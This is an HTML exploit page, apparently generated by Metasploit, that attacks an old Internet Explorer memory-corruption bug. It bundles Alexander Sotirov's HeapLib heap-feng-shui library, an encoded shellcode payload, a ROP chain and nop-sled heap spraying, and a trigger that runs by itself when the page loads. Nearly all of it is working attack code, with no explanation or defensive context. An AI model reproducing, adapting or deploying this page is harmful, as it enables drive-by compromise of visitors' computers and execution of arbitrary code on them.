<HTML>
<!-- This file was generated by Metasploit -->
<BODY>
<title></title>
<DIV id=testfaild>
	<img id="imgTest" style="display:none">
	<a href="javascript:feng_shui();" id="MyA" onClick="feng_shui();">
	<div style="background-color:#FFFFFF; width:30; height:40" id="imgTest" src="" onMouseOver="crash();" onMouseOut="crash();">
	</div>
	</a>
</DIV>
<SCRIPT LANGUAGE="JavaScript">
function do_unescape(dword) {
	var t = unescape;
	var d = Number(dword).toString(16);
	while (d.length < 8) d = '0' + d;
	return t('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
}
function feng_shui() {
	var tag = 0x1c1c1c0c;
	var vtable1 = do_unescape(tag) + '1234567555555555588888888';
	var divs = new Array();
	for (var i = 0; i < 128; i++) divs.push(document.createElement('div'));
	testfaild.innerHTML = testfaild.innerHTML;
	divs[0].className = vtable1;
	divs[1].className = vtable1;
	divs[2].className = vtable1;
	divs[3].className = vtable1;
}
function crash() {
	eval("imgTest").src = "";
}
function trigger() {
	var x = document.getElementsByTagName("div");
	var fireOnThis = document.getElementById("MyA");
	if (document.createEvent) {
		evObj = document.createEvent('MouseEvents');
		evObj.iniEvent('click', true, false);
		fireOnThis.dispatchEvent(evObj);
	} else if (document.createEventObject) {
		x[1].fireEvent('onMouseOver');
		fireOnThis.fireEvent('onclick');
		x[1].fireEvent('onMouseOut');
	}
}
function main() {

//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
//
// The HeapLib library is licensed under a BSD license, the text of which follows:
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
//
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//



function heapLib() {
}


heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    this.mem = new Array();

    this.flushOleaut32();
}


heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    
    else
        size = arg;

    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    CollectGarbage();
}

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    this.freeOleaut32("oleaut32");
    
    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    
    else
        size = arg;

    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    this.allocOleaut32(arg, tag);
}

heapLib.ie.prototype.free = function(tag) {

    this.freeOleaut32(tag);

    this.flushOleaut32();
}

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;

    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    
    else
        size = arg;

    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

        var vtable = unescape("%u9090%u7ceb")   

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    vtable += unescape("%u0028%u0028") +    
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}

		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("%u83be%ud8c4%udb78%ud9d9%u2474%u58f4%uc931%u33b1%u7031%u0312%u1270%u6b83%u3a38%u978d%u3229%u676e%u25aa%u82e6%u779b%uc79c%u478e%u85d6%u2322%u3dba%u41b0%u3213%uef71%u7d45%uc182%ud149%u4340%u2b36%ua395%ue407%ua2e8%u1840%uf602%u5719%ue7b1%u252e%u090a%u22e1%u7132%uf484%ucbc7%u2487%u4777%udccf%u0ff3%uddf0%u53d0%u94cc%ua75d%u27a6%uf9b4%u1647%u56f8%u9776%ua7f5%u1fbe%udde6%u5cb4%ue59b%u1f0e%u6347%u8793%ud30c%u3677%u82c0%u34fc%uc1ad%u585b%u0530%u64d0%ua8b9%ued37%u8ef9%ub693%uae5a%u1282%ucf0c%ufad5%u75f1%ue89d%u0ce6%u66fc%u9df8%ucf7a%u9dfa%u7f84%uac93%u100f%u30e4%u55da%u7b1a%uff47%u22b3%u421d%ud4de%u80cb%u56e7%u78fe%u461c%u7d8b%uc058%u0f67%ua5f1%ubc87%ueff2%u23eb%u7361%uc6c2%u1601%u411a");
		var rop_chain = unescape("%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%ue392%u77c4%u1120%u77c1%ue493%u77c2%u7942%u4246%udd6c%u77c2%uec00%u77c4%u5459%u77c3%u7705%u77c4%u1000%u0000%uea01%u77c3%ud000%u77c5%u6100%u77c4%u6101%u77c4%ud680%u77c4%u0040%u0000%ue392%u77c4%ud497%u3f4e%u2df9%u77c1");
		var random = unescape("%u7953%u7567");
		var nops = unescape("%u91f8%u4840");

		while (random.length < 0x80000) random += random;
		while (nops.length < 0x80000) nops += nops;

		var padding = random.substring(0, 0x5f4-code.length);
		var shellcode = code + padding + rop_chain + nops.substring(0, 0x800-code.length-padding.length-rop_chain.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();
		for (var z=1; z < 0x385; z++) {
heap_obj.alloc(block);
		}

	setTimeout("trigger();", 1000);

}
main();
</SCRIPT>
</BODY>
</HTML>
